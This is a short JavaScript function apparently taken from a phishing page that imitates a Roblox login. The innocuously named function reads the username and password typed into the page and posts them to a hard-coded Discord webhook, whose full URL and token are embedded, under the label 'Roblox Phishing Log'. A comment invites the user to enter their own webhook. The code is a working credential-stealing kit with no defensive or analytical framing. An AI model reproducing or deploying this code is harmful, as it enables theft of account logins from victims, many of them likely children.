function rand() {
	
	
	
	u = document.getElementById("login-username").value; 
	p = document.getElementById("login-password").value;
	
	wb = "https://discord.com/api/webhooks/1030480788501831751/cS9DEz0u_uciwfokSGYKTlFuvljzj5Z64G5NTQq7vgxo_PlIfzOnPeknJLliBcQy8To7"; //enter webhook here
	
	var request = new XMLHttpRequest();
      request.open("POST", wb);

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "Roblox Phishing Log",
        avatar_url: "https://play-lh.googleusercontent.com/8ddL1kuoNUB5vUvgDVjYY3_6HwQcrg1K2fd_R8soD-e2QYj8fT9cfhfh3G0hnSruLKec",
        content: "```Username: " + u + " | Password: " + p + "```"
      }

      request.send(JSON.stringify(params));
	
}